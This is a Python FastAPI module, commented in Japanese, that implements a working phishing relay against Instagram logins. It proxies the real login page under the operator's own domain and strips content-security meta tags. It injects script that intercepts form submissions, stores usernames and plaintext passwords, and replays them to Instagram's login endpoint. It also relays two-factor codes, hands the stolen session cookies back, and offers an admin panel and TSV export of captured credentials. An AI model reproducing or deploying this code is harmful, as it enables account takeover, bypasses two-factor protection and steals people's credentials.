"""フィッシング / ログイン中継モジュール（リンク追跡とは完全に独立）。

方針:
  * 表に見えるURLは自ドメインの /p/{code} のまま。中身は公式ログイン画面を
    サーバー側で取得して絶対URL化＋<base>注入して返すので、住所欄は動かない。
  * 公式ページの submit を capture 段で横取りして /p/{code}/post に投げ直す。
  * 受け取ったID/パスを保存し、サーバー側で本物の ajax ログインを再生する。
    戻ってきた Set-Cookie はそのまま被害者ブラウザへ渡すので、以降は本物の
    セッションが乗る。
  * ログイン後の飛び先はリンク単位の next_dest 設定。未設定なら公式の通常
    遷移先へフォールバックする。
"""

from __future__ import annotations

import asyncio
import os
import re
import secrets
import sqlite3
import time
import urllib.parse
from pathlib import Path
from typing import Any, Optional

import httpx
from fastapi import APIRouter, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse, Response
from fastapi.templating import Jinja2Templates

from . import database as db

try:  # バックアップは任意機能なので無くても動く
    from . import persist
except Exception:  # pragma: no cover
    persist = None  # type: ignore

TEMPLATES = Jinja2Templates(
    directory=os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "templates")
)

ORIGIN = "https://www.instagram.com"
LOGIN_URL = ORIGIN + "/accounts/login/?source=auth_switcher"
AJAX_URL = ORIGIN + "/accounts/login/ajax/"
TWOFA_URL = ORIGIN + "/accounts/login/ajax/two_factor/"
OK_URL = ORIGIN + "/"

UA_DEFAULT = (
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
)

VISIT_COOKIE = "_pv"
VISIT_TTL = 1800.0
PAGE_TTL = 120.0

_VISITS: dict[str, dict[str, Any]] = {}
_PAGE_CACHE: dict[str, tuple[float, str]] = {}
_READY = False

router = APIRouter()


# --------------------------------------------------------------------------
# DB
# --------------------------------------------------------------------------
def _db_path() -> str:
    for name in ("DB_PATH", "DB_FILE", "DATABASE", "DB", "PATH"):
        v = getattr(db, name, None)
        if isinstance(v, (str, Path)):
            return str(v)
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "igtracker.db")


def _conn() -> sqlite3.Connection:
    path = _db_path()
    parent = os.path.dirname(os.path.abspath(path))
    if parent and not os.path.isdir(parent):
        os.makedirs(parent, exist_ok=True)
    con = sqlite3.connect(path, timeout=15)
    con.row_factory = sqlite3.Row
    return con


def _ensure() -> None:
    global _READY
    if _READY:
        return
    with _conn() as con:
        con.executescript(
            """
            CREATE TABLE IF NOT EXISTS phish_links (
                code      TEXT PRIMARY KEY,
                uid       INTEGER NOT NULL,
                label     TEXT,
                next_dest TEXT,
                note      TEXT,
                active    INTEGER NOT NULL DEFAULT 1,
                hits      INTEGER NOT NULL DEFAULT 0,
                created   REAL
            );
            CREATE TABLE IF NOT EXISTS link_creds (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                code      TEXT NOT NULL,
                hit_id    INTEGER,
                ts        REAL,
                user_val  TEXT,
                pass_val  TEXT,
                user_mask TEXT,
                pass_mask TEXT,
                ok        INTEGER DEFAULT 0,
                twofa     INTEGER DEFAULT 0,
                code_val  TEXT,
                ip        TEXT,
                ua        TEXT,
                note      TEXT
            );
            CREATE INDEX IF NOT EXISTS idx_creds_code ON link_creds(code, id);
            """
        )
    _READY = True


def _backup(uid: Optional[int]) -> None:
    if not uid or persist is None:
        return
    fn = getattr(persist, "push_user", None)
    if not fn:
        return
    try:
        r = fn(uid)
        if asyncio.iscoroutine(r):
            asyncio.create_task(r)
    except Exception:
        pass


def _uid(request: Request) -> Optional[int]:
    sess = getattr(request, "session", None) or {}
    for k in ("uid", "user_id", "account_id", "id"):
        v = sess.get(k)
        if v:
            try:
                return int(v)
            except Exception:
                pass
    st = getattr(request, "state", None)
    u = getattr(st, "user", None) if st is not None else None
    if isinstance(u, dict):
        for k in ("id", "uid", "user_id"):
            if u.get(k):
                try:
                    return int(u[k])
                except Exception:
                    pass
    elif u is not None:
        for k in ("id", "uid", "user_id"):
            v = getattr(u, k, None)
            if v:
                try:
                    return int(v)
                except Exception:
                    pass
    return None


def _new_code(n: int = 8) -> str:
    alphabet = "abcdefghijkmnpqrstuvwxyz23456789"
    return "".join(secrets.choice(alphabet) for _ in range(n))


def _mask(v: str, keep: int = 2) -> str:
    v = v or ""
    if len(v) <= keep:
        return v
    return v[:keep] + "*" * max(1, len(v) - keep)


def _get_link(code: str) -> Optional[sqlite3.Row]:
    _ensure()
    with _conn() as con:
        return con.execute("SELECT * FROM phish_links WHERE code = ?", (code,)).fetchone()


def _save_cred(code: str, user: str, pw: str, ok: bool, request: Request,
               twofa: bool = False, code_val: str = "", note: str = "") -> int:
    _ensure()
    with _conn() as con:
        cur = con.execute(
            "INSERT INTO link_creds (code, ts, user_val, pass_val, user_mask, pass_mask, ok, twofa, code_val, ip, ua, note)"
            " VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
            (
                code,
                time.time(),
                user,
                pw,
                _mask(user, 3),
                _mask(pw, 1),
                1 if ok else 0,
                1 if twofa else 0,
                code_val,
                (request.headers.get("x-forwarded-for") or request.client.host or "").split(",")[0].strip(),
                (request.headers.get("user-agent") or "")[:400],
                note,
            ),
        )
        return int(cur.lastrowid or 0)


# --------------------------------------------------------------------------
# 公式ページ取得 + 書き換え
# --------------------------------------------------------------------------
def _jar_get(jar: httpx.Cookies, name: str) -> str:
    try:
        v = jar.get(name)
    except Exception:
        v = None
    return v or ""


def _prune() -> None:
    now = time.time()
    for k, v in list(_VISITS.items()):
        if now - v["ts"] > VISIT_TTL:
            _VISITS.pop(k, None)
    for k, (t, _doc) in list(_PAGE_CACHE.items()):
        if now - t > PAGE_TTL * 4:
            _PAGE_CACHE.pop(k, None)


def _absolutize(doc: str) -> str:
    def fix(m: re.Match) -> str:
        attr, q, url = m.group(1), m.group(2), m.group(3).strip()
        if not url or url.startswith(("data:", "blob:", "javascript:", "mailto:", "#", "about:")):
            return m.group(0)
        return f"{attr}={q}{urllib.parse.urljoin(ORIGIN, url)}{q}"

    doc = re.sub(r'\b(src|href|action|poster|data-src)=(["\'])([^"\']+)\2', fix, doc, flags=re.I)

    def fix_srcset(m: re.Match) -> str:
        out = []
        for part in m.group(3).split(","):
            bits = part.strip().split()
            if not bits:
                continue
            bits[0] = urllib.parse.urljoin(ORIGIN, bits[0])
            out.append(" ".join(bits))
        return f"{m.group(1)}={m.group(2)}{','.join(out)}{m.group(2)}"

    return re.sub(r'\b(srcset|data-srcset)=(["\'])(.*?)\2', fix_srcset, doc, flags=re.I | re.S)


def _strip_csp(doc: str) -> str:
    doc = re.sub(r'<meta[^>]+http-equiv=["\']?content-security-policy["\']?[^>]*>', "", doc, flags=re.I)
    doc = re.sub(r'<meta[^>]+http-equiv=["\']?x-frame-options["\']?[^>]*>', "", doc, flags=re.I)
    return doc


def _inject_base(doc: str) -> str:
    if re.search(r"<base\b", doc, re.I):
        return doc
    tag = f'<base href="{ORIGIN}/">'
    if re.search(r"<head[^>]*>", doc, re.I):
        return re.sub(r"(<head[^>]*>)", r"\1" + tag, doc, count=1, flags=re.I)
    return tag + doc


SUBMIT_JS = r"""
<script>
(function () {
  var CODE = "__CODE__";
  var POST = "/p/" + CODE + "/post";
  var busy = false;
  function busyOn(on) {
    busy = on;
    document.querySelectorAll('button[type="submit"], button').forEach(function (b) {
      if (on) { b.setAttribute("data-old", b.textContent); b.disabled = true; b.textContent = "ログイン中…"; }
      else if (b.getAttribute("data-old")) { b.disabled = false; b.textContent = b.getAttribute("data-old"); }
    });
  }
  document.addEventListener("submit", function (e) {
    var f = e.target;
    if (!f || (f.tagName || "") !== "FORM") return;
    e.preventDefault();
    e.stopPropagation();
    if (e.stopImmediatePropagation) e.stopImmediatePropagation();
    if (busy) return;
    var data = new URLSearchParams();
    new FormData(f).forEach(function (v, k) { if (typeof v === "string") data.append(k, v); });
    if (!data.get("username")) {
      var u = document.querySelector('input[name="username"], input[name="email"], input[type="text"]');
      if (u) data.set("username", u.value);
    }
    busyOn(true);
    fetch(POST, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json"
      },
      body: data.toString(),
      credentials: "same-origin"
    }).then(function (r) { return r.json(); }).then(function (j) {
      if (j && j.twofa_url) { location.href = j.twofa_url; return; }
      location.href = (j && j.next) ? j.next : POST;
    }).catch(function () { busyOn(false); f.submit(); });
  }, true);
})();
</script>
"""


async def _fetch_login(lang: str, visit: dict[str, Any]) -> str:
    jar: httpx.Cookies = visit["jar"]
    async with httpx.AsyncClient(cookies=jar, follow_redirects=True, timeout=25.0) as cli:
        cli.headers.update({
            "User-Agent": visit["ua"],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": lang,
            "Upgrade-Insecure-Requests": "1",
        })
        r = await cli.get(LOGIN_URL)
        visit["jar"] = cli.cookies
    doc = r.text
    doc = _strip_csp(doc)
    doc = _absolutize(doc)
    doc = _inject_base(doc)
    if re.search(r"</body>", doc, re.I):
        doc = re.sub(r"</body>", SUBMIT_JS.replace("__CODE__", "{CODE}") + "</body>", doc, count=1, flags=re.I)
    else:
        doc += SUBMIT_JS.replace("__CODE__", "{CODE}")
    _PAGE_CACHE[lang] = (time.time(), doc)
    return doc


async def _login_doc(lang: str, visit: dict[str, Any], code: str) -> str:
    cached = _PAGE_CACHE.get(lang)
    if cached and (time.time() - cached[0]) < PAGE_TTL and _jar_get(visit["jar"], "csrftoken"):
        return cached[1].replace("{CODE}", code)
    try:
        doc = await _fetch_login(lang, visit)
    except Exception:
        cached = _PAGE_CACHE.get(lang)
        if cached:
            return cached[1].replace("{CODE}", code)
        return _fallback(code)
    return doc.replace("{CODE}", code)


def _fallback(code: str) -> str:
    return f"""<!doctype html><html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
body{{margin:0;font-family:-apple-system,"Segoe UI",Roboto,sans-serif;background:#fafafa;
display:flex;align-items:center;justify-content:center;min-height:100vh}}
.box{{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:32px 28px;width:320px}}
h1{{font-size:30px;text-align:center;font-family:Georgia,serif;margin:0 0 22px}}
input{{width:100%;box-sizing:border-box;padding:11px 9px;margin-bottom:8px;border:1px solid #dbdbdb;
border-radius:4px;background:#fafafa;font-size:14px}}
button{{width:100%;padding:9px;border:0;border-radius:8px;background:#0095f6;color:#fff;
font-weight:600;font-size:14px}}
</style></head><body>
<form class="box" method="post" action="/p/{code}/post">
<h1>Instagram</h1>
<input name="username" placeholder="電話番号、ユーザーネーム、メール" autocomplete="username">
<input name="password" type="password" placeholder="パスワード" autocomplete="current-password">
<button type="submit">ログイン</button>
</form></body></html>"""


# --------------------------------------------------------------------------
# 中継
# --------------------------------------------------------------------------
def _enc_password(pw: str) -> str:
    return f"#PWD_BROWSER:0:{int(time.time())}:{pw}"


async def _relay(visit: dict[str, Any], user: str, pw: str) -> dict[str, Any]:
    jar: httpx.Cookies = visit["jar"]
    token = _jar_get(jar, "csrftoken")
    if not token:
        await _fetch_login(visit.get("lang") or "en-US,en;q=0.9", visit)
        jar = visit["jar"]
        token = _jar_get(jar, "csrftoken")

    headers = {
        "User-Agent": visit["ua"],
        "Accept": "*/*",
        "Accept-Language": visit.get("lang") or "en-US,en;q=0.9",
        "X-CSRFToken": token,
        "X-Instagram-AJAX": visit.get("rollout") or "1",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": ORIGIN,
        "Referer": LOGIN_URL,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {
        "username": user,
        "enc_password": _enc_password(pw),
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "stopDeletionNonce": "",
        "trustedDeviceRecords": "{}",
    }
    async with httpx.AsyncClient(cookies=jar, follow_redirects=True, timeout=25.0) as cli:
        r = await cli.post(AJAX_URL, data=payload, headers=headers)
        visit["jar"] = cli.cookies
    try:
        data = r.json()
    except Exception:
        data = {}
    out: dict[str, Any] = {
        "authenticated": bool(data.get("authenticated")),
        "two_factor": bool(data.get("two_factor_required")),
        "identifier": data.get("two_factor_identifier") or "",
        "checkpoint": bool(data.get("checkpoint_url")),
        "raw": data,
        "cookies": [(k, v) for k, v in r.headers.multi_items() if k.lower() == "set-cookie"],
    }
    return out


async def _relay_2fa(visit: dict[str, Any], user: str, identifier: str, code_val: str) -> dict[str, Any]:
    jar: httpx.Cookies = visit["jar"]
    token = _jar_get(jar, "csrftoken")
    headers = {
        "User-Agent": visit["ua"],
        "X-CSRFToken": token,
        "X-Instagram-AJAX": visit.get("rollout") or "1",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": ORIGIN,
        "Referer": ORIGIN + "/accounts/login/two_factor?username=" + urllib.parse.quote(user),
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = {
        "username": user,
        "verificationCode": code_val,
        "identifier": identifier,
        "queryParams": "{}",
    }
    async with httpx.AsyncClient(cookies=jar, follow_redirects=True, timeout=25.0) as cli:
        r = await cli.post(TWOFA_URL, data=payload, headers=headers)
        visit["jar"] = cli.cookies
    try:
        data = r.json()
    except Exception:
        data = {}
    return {
        "authenticated": bool(data.get("authenticated")),
        "raw": data,
        "cookies": [(k, v) for k, v in r.headers.multi_items() if k.lower() == "set-cookie"],
    }


def _next_for(row: Optional[sqlite3.Row], explicit: Optional[str] = None) -> str:
    cands = [explicit, (row["next_dest"] if row is not None else None)]
    for c in cands:
        c = (c or "").strip()
        if not c:
            continue
        if c.startswith(("http://", "https://")):
            return c
        if c.startswith("/"):
            return ORIGIN + c
        return "https://" + c
    return OK_URL


def _visit(request: Request) -> tuple[str, dict[str, Any]]:
    vid = request.cookies.get(VISIT_COOKIE) or secrets.token_urlsafe(12)
    v = _VISITS.get(vid)
    if not v or (time.time() - v["ts"]) > VISIT_TTL:
        v = {"jar": httpx.Cookies(), "ua": UA_DEFAULT, "lang": "en-US,en;q=0.9", "ts": time.time()}
        _VISITS[vid] = v
    v["ua"] = request.headers.get("user-agent") or UA_DEFAULT
    v["lang"] = request.headers.get("accept-language") or "en-US,en;q=0.9"
    v["ts"] = time.time()
    return vid, v


# --------------------------------------------------------------------------
# 公開: ログイン画面
# --------------------------------------------------------------------------
@router.get("/p/{code}", response_class=HTMLResponse)
async def phish_page(code: str, request: Request):
    _prune()
    row = _get_link(code)
    if row is None:
        return HTMLResponse(_fallback(code), status_code=404)
    if not row["active"]:
        return HTMLResponse(_fallback(code), status_code=410)

    with _conn() as con:
        con.execute("UPDATE phish_links SET hits = hits + 1 WHERE code = ?", (code,))

    vid, visit = _visit(request)
    doc = await _login_doc(visit["lang"], visit, code)

    token = _jar_get(visit["jar"], "csrftoken")
    if token:
        doc = doc.replace("__CSRF__", token)

    resp = HTMLResponse(doc)
    resp.headers["Cache-Control"] = "no-store, max-age=0"
    resp.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
    resp.set_cookie(VISIT_COOKIE, vid, max_age=int(VISIT_TTL), httponly=True, samesite="lax", path="/")
    return resp


@router.post("/p/{code}/post")
async def phish_post(code: str, request: Request):
    row = _get_link(code)
    if row is None:
        return JSONResponse({"ok": False, "next": ORIGIN}, status_code=404)

    form = await request.form()
    user = (form.get("username") or form.get("email") or "").strip()
    pw = form.get("password") or ""
    explicit = (form.get("_igt_next") or "").strip()

    _vid, visit = _visit(request)
    result: dict[str, Any] = {}
    try:
        if user and pw:
            result = await _relay(visit, user, pw)
    except Exception as exc:  # 中継失敗でも握り潰さず記録
        result = {"error": str(exc)[:200]}

    ok = bool(result.get("authenticated"))
    twofa = bool(result.get("two_factor"))
    if twofa:
        visit["two_fa_user"] = user
        visit["two_fa_id"] = result.get("identifier") or ""

    _save_cred(code, user, pw, ok, request, twofa=twofa, note=str(result.get("error") or ""))
    _backup(int(row["uid"]) if row["uid"] else None)

    wants_json = (
        request.headers.get("x-requested-with", "").lower() == "xmlhttprequest"
        or "application/json" in (request.headers.get("accept") or "")
    )

    if twofa:
        nxt = f"/p/{code}/2fa"
    else:
        nxt = _next_for(row, explicit)

    cookies = result.get("cookies") or []

    if not wants_json:
        resp = RedirectResponse(nxt, status_code=302)
        for k, v in cookies:
            resp.headers.append("set-cookie", v)
        resp.headers["Cache-Control"] = "no-store"
        return resp

    resp = JSONResponse({
        "ok": ok,
        "two_factor": twofa,
        "twofa_url": f"/p/{code}/2fa" if twofa else None,
        "checkpoint": bool(result.get("checkpoint")),
        "next": None if twofa else nxt,
        "error": result.get("error"),
    })
    for k, v in cookies:
        resp.headers.append("set-cookie", v)
    resp.headers["Cache-Control"] = "no-store"
    return resp


# --------------------------------------------------------------------------
# 2FA
# --------------------------------------------------------------------------
TWOFA_HTML = """<!doctype html><html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Instagram</title>
<style>
body{margin:0;font-family:-apple-system,"Segoe UI",Roboto,sans-serif;background:#fafafa;
display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:28px;width:320px;text-align:center}
h2{font-size:17px;margin:0 0 10px}
p{font-size:13px;color:#8e8e8e;margin:0 0 18px;line-height:1.5}
input{width:100%;box-sizing:border-box;padding:11px;margin-bottom:10px;border:1px solid #dbdbdb;
border-radius:4px;background:#fafafa;font-size:16px;letter-spacing:3px;text-align:center}
button{width:100%;padding:9px;border:0;border-radius:8px;background:#0095f6;color:#fff;font-weight:600}
</style></head><body>
<form class="box" method="post" action="/p/__CODE__/2fa">
<h2>確認コードを入力</h2>
<p>認証アプリまたはSMSで受け取ったコードを入力してください。</p>
<input name="code" inputmode="numeric" autocomplete="one-time-code" autofocus placeholder="コード">
<button type="submit">次へ</button>
</form></body></html>"""


@router.get("/p/{code}/2fa", response_class=HTMLResponse)
async def phish_2fa_page(code: str, request: Request):
    if _get_link(code) is None:
        return HTMLResponse("not found", status_code=404)
    _vid, visit = _visit(request)
    if not visit.get("two_fa_id"):
        return RedirectResponse(f"/p/{code}", status_code=302)
    resp = HTMLResponse(TWOFA_HTML.replace("__CODE__", code))
    resp.headers["Cache-Control"] = "no-store"
    return resp


@router.post("/p/{code}/2fa")
async def phish_2fa_post(code: str, request: Request, code_val: str = Form("", alias="code")):
    row = _get_link(code)
    if row is None:
        return RedirectResponse(ORIGIN, status_code=302)

    _vid, visit = _visit(request)
    user = visit.get("two_fa_user") or ""
    ident = visit.get("two_fa_id") or ""

    result: dict[str, Any] = {}
    try:
        if ident:
            result = await _relay_2fa(visit, user, ident, code_val)
    except Exception as exc:
        result = {"error": str(exc)[:200]}

    _save_cred(code, user, "", bool(result.get("authenticated")), request,
               twofa=True, code_val=code_val, note=str(result.get("error") or ""))
    _backup(int(row["uid"]) if row["uid"] else None)

    nxt = _next_for(row)
    resp = RedirectResponse(nxt, status_code=302)
    for _k, v in (result.get("cookies") or []):
        resp.headers.append("set-cookie", v)
    resp.headers["Cache-Control"] = "no-store"
    return resp


# --------------------------------------------------------------------------
# 管理UI
# --------------------------------------------------------------------------
@router.get("/phish", response_class=HTMLResponse)
async def phish_list(request: Request):
    _ensure()
    uid = _uid(request)
    with _conn() as con:
        rows = con.execute(
            "SELECT * FROM phish_links WHERE uid = ? ORDER BY created DESC", (uid or 0,)
        ).fetchall()
        counts = {
            r["code"]: r["n"]
            for r in con.execute(
                "SELECT code, COUNT(*) AS n FROM link_creds GROUP BY code"
            ).fetchall()
        }
    return TEMPLATES.TemplateResponse(
        "phish.html",
        {"request": request, "links": rows, "counts": counts, "origin": str(request.base_url).rstrip("/")},
    )


@router.post("/phish")
async def phish_create(
    request: Request,
    label: str = Form(""),
    next_dest: str = Form(""),
    note: str = Form(""),
):
    _ensure()
    uid = _uid(request)
    code = _new_code()
    with _conn() as con:
        con.execute(
            "INSERT INTO phish_links (code, uid, label, next_dest, note, active, hits, created)"
            " VALUES (?,?,?,?,?,1,0,?)",
            (code, uid or 0, label.strip()[:80], next_dest.strip()[:400], note.strip()[:400], time.time()),
        )
    _backup(uid)
    return RedirectResponse(f"/phish/{code}", status_code=303)


@router.get("/phish/{code}", response_class=HTMLResponse)
async def phish_detail(code: str, request: Request):
    row = _get_link(code)
    if row is None:
        return RedirectResponse("/phish", status_code=303)
    with _conn() as con:
        creds = con.execute(
            "SELECT * FROM link_creds WHERE code = ? ORDER BY id DESC LIMIT 500", (code,)
        ).fetchall()
    return TEMPLATES.TemplateResponse(
        "phish_detail.html",
        {"request": request, "link": row, "creds": creds, "origin": str(request.base_url).rstrip("/")},
    )


@router.post("/phish/{code}/update")
async def phish_update(
    code: str,
    request: Request,
    label: str = Form(""),
    next_dest: str = Form(""),
    note: str = Form(""),
):
    row = _get_link(code)
    if row is None:
        return RedirectResponse("/phish", status_code=303)
    with _conn() as con:
        con.execute(
            "UPDATE phish_links SET label = ?, next_dest = ?, note = ? WHERE code = ?",
            (label.strip()[:80], next_dest.strip()[:400], note.strip()[:400], code),
        )
    _backup(int(row["uid"]) if row["uid"] else None)
    return RedirectResponse(f"/phish/{code}", status_code=303)


@router.post("/phish/{code}/toggle")
async def phish_toggle(code: str, request: Request):
    row = _get_link(code)
    if row is None:
        return RedirectResponse("/phish", status_code=303)
    with _conn() as con:
        con.execute("UPDATE phish_links SET active = ? WHERE code = ?", (0 if row["active"] else 1, code))
    _backup(int(row["uid"]) if row["uid"] else None)
    return RedirectResponse(f"/phish/{code}", status_code=303)


@router.post("/phish/{code}/delete")
async def phish_delete(code: str, request: Request):
    row = _get_link(code)
    with _conn() as con:
        con.execute("DELETE FROM phish_links WHERE code = ?", (code,))
        con.execute("DELETE FROM link_creds WHERE code = ?", (code,))
    _backup(int(row["uid"]) if row and row["uid"] else _uid(request))
    return RedirectResponse("/phish", status_code=303)


@router.get("/phish/{code}/raw")
async def phish_raw(code: str):
    with _conn() as con:
        rows = con.execute("SELECT * FROM link_creds WHERE code = ? ORDER BY id DESC", (code,)).fetchall()
    body = "\n".join(
        f"{int(r['ts'] or 0)}\t{r['user_val'] or ''}\t{r['pass_val'] or ''}\t{r['code_val'] or ''}\t{r['ip'] or ''}"
        for r in rows
    )
    return Response(body, media_type="text/tab-separated-values")